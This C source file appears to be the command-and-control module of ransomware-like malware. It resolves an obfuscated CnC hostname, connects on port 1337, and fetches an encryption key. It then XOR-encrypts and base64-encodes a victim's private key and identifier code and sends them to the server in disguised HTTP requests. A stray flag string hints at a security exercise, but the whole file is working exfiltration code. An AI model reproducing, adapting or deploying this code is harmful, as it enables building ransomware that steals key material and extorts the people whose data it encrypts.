#define _GNU_SOURCE
#include <netdb.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include "base64.h"
#include "comm.h"
#include "logs.h"
#include "strings.h"

const unsigned char PAYLOAD_ENCRYPTION_KEY = 42;

const int CNC_PORT = 1337;

char* __replace_crlf(char* input)
{
    char* result;
    int counter;
    char* iterator;

    // Count how many crlf to replace
    __DEBUG("Count CRLF");
    
    iterator = input;
    counter = 0;
    while (*iterator)
    {
        if (*iterator == '\n' || *iterator == '\r')
            counter++;
        iterator++;
    }

    result = calloc(strlen(input) + (counter * 2), sizeof(char));

    __DEBUG("Start replace");
    iterator = input;
    counter = 0;
    while (*iterator)
    {
        if (*iterator == '\n')
        {
            result[counter++] = '\\';
            result[counter++] = 'n';
        }
        else if(*iterator == '\r')
        {
            result[counter++] = '\\';
            result[counter++] = 'r';
        }
        else
        {
            result[counter++] = *iterator;
        }

        iterator++;
    }

    __DEBUG("Replace done.");
    return result;
}

int __init_socket()
{
    int sock, ret;
    char cnc_addr[128];
    struct sockaddr_in sockaddr;
    struct hostent *he;

    __DEBUG("Connect to the CnC.");
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1)
    {
        __DEBUG("Cannot init socket.");
        return -1;
    }

    __DEBUG("Get host by name")
    unlock_app_strings();
    strcpy(cnc_addr, get_string(__STRING_CNC_ADDRESS));
    lock_app_strings();

    __DEBUG(cnc_addr);

    he = gethostbyname(cnc_addr);
    if (he == NULL)
    {
        __DEBUG("Cannot resolve hostname.");
        return -2;
    }

    __DEBUG("Prepare sockaddr")
    memcpy(&sockaddr.sin_addr, he->h_addr, he->h_length);
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_port = htons(CNC_PORT);

    __DEBUG("Connect.")
    ret = connect(sock, (struct sockaddr*) &sockaddr, sizeof(sockaddr));
    if (ret < 0)
    {
        __DEBUG("Cannot connect.");
        return -1;
    }

    return sock;
}

void __encrypt_envelope(char* envelope)
{
    while (*envelope)
    {
        *envelope ^= PAYLOAD_ENCRYPTION_KEY;
        envelope++;
    }
}

void __decrypt_envelope(unsigned char *envelope, size_t len)
{
    size_t i;

    for (i = 0; i < len; i++)
        envelope[i] ^= PAYLOAD_ENCRYPTION_KEY;
}

unsigned char* __encrypt_payload(char* payload, unsigned char* key, size_t key_len)
{
    unsigned char* result, *ptr;
    size_t i, result_len;

    __DEBUG("Encrypt payload")

    ptr = payload;
    i = 0;
    while (*ptr)
    {
        *ptr ^= key[i % (key_len - 1)];
        ptr++;
        i++;
    }

    payload[i] = 0;

    __DEBUG("Base64")
    return base64_encode(payload, i, &result_len);
}

unsigned char* __get_payload_encryption_key(size_t* key_len)
{
    char response[4096];
    char *request, *header, *payload, *ptr, *key_offset;
    unsigned char* key;
    size_t request_len, i;
    int ret;
    int sock;

    key = NULL;

    sock = __init_socket();
    if (sock <= 0)
        return key;

    unlock_app_strings();
    asprintf(&payload, get_string(__STRING_HTTP_PAYLOAD_ENVELOPE), "keygen", get_string(__STRING_NULL));

    header = get_string(__STRING_HTTP_HEADER);
    request_len = strlen(header) + strlen(payload) + 1;
    request = calloc(request_len, sizeof(char));
    __encrypt_envelope(payload);
    strncpy(request, header,  strlen(header));
    strncat(request, payload, strlen(payload));
    lock_app_strings();

    __DEBUG("Ask server enc key.")
    __DEBUG(request);
    ret = send(sock, request, request_len - 1, 0);
    free(request);

    if (ret <= 0)
        goto close_enc;

    __DEBUG("Wait response.");
    ret = recv(sock, response, sizeof(response), MSG_WAITALL);
    if (ret <= 0)
        goto close_enc;

    response[ret] = 0;

    // Skip headers
    __DEBUG("Skip headers");
    ptr = response;
    while (*ptr)
    {
        if (*ptr == '\r' && *(ptr+1) == '\n' &&
            *(ptr+2) == '\r' && *(ptr+3) == '\n')
        {
             ptr += 4;
             break;
        }

        ptr++;
    }

    __DEBUG(response);
    __DEBUG("Decrypt envelope");
    __decrypt_envelope(ptr, ret - (ptr - response));
    response[ret] = 0;
    __DEBUG(response);

    // Now parse the decrypted body to extract the key
    *key_len = 0;
    while (*ptr)
    {
        if (*ptr == '$' && *(ptr+1) == '$')
        {
            // Second $$
            if (*key_len > 0)
                break;

            key_offset = ptr + 2;
            ptr++;  // Increment 2 times (skip the $$ tag)
            (*key_len)++; // Start couting
        }
        else if(*key_len > 0)
            (*key_len)++;

        ptr++;
    }

    key = malloc((*key_len) + 1);
    if (*key_len > 0)
        memcpy(key, key_offset, *key_len);
    key[*key_len] = 0;

    __DEBUG(key);

close_enc:
    close(sock);

    return key;
}

char* build_http_request(char* private_key, const char* code, unsigned char* encryption_key, size_t encryption_key_len)
{
    char *request, *header, *envelope, *payload, *encoded_payload, *stripped_key;
    size_t payload_len;

    stripped_key = __replace_crlf(private_key);

    __DEBUG("Build http payload.");
    unlock_app_strings();
    payload_len = asprintf(&payload, get_string(__STRING_HTTP_PAYLOAD), code, stripped_key, get_string(__STRING_INSA_FLAG));

    asprintf(&encoded_payload, "\"%s\"\n", __encrypt_payload(payload, encryption_key, encryption_key_len));
    __DEBUG(encoded_payload);

    asprintf(&envelope, get_string(__STRING_HTTP_PAYLOAD_ENVELOPE), "register", encoded_payload);

    header = get_string(__STRING_HTTP_HEADER);
    request = calloc(strlen(header) + strlen(envelope) + 1, sizeof(char));
    __DEBUG("Encrypt payload.");
    __encrypt_envelope(envelope);
    __DEBUG("Concat.");
    strncpy(request, header,  strlen(header));
    strncat(request, envelope, strlen(envelope));
    lock_app_strings();

    free(stripped_key);
    free(payload);
    free(envelope);
    free(encoded_payload);

    return request;
}

int send_private_key(char* private_key, const char* code)
{
    int ret;
    int sock;
    char* request;
    char  response[4096];
    ssize_t response_len;
    size_t encryption_key_len;
    unsigned char* encryption_key;

    __DEBUG("Retrieve enc key");
    encryption_key = __get_payload_encryption_key(&encryption_key_len);
    if (encryption_key == NULL)
    {
        __DEBUG("Cannot retrieve key");
        return -5;
    }

    sock = __init_socket();
    if (sock < 0)
    {
        __DEBUG("Cannot connect to the CnC");
        return -1;
    }

    __DEBUG("Build http.");
    request = build_http_request(private_key, code, encryption_key, encryption_key_len);

    __DEBUG("Send payload.");
    if (send(sock, request, strlen(request), 0) <= 0)
    {
        ret = -2;
        goto free_request;
    }

    __DEBUG("Recv res.");
    response_len = recv(sock, response, sizeof(response), MSG_WAITALL);
    if (response_len < 0)
    {
        __DEBUG("Error while receiving response from CnC.");
        ret = -3;
        goto free_request;
    }
    else
    {
        ret = 0;
        __DEBUG(response);
    }

free_request:
    __DEBUG("Free request.");
    free(request);
    free(encryption_key);

close:
    close(sock);
    return ret;
}
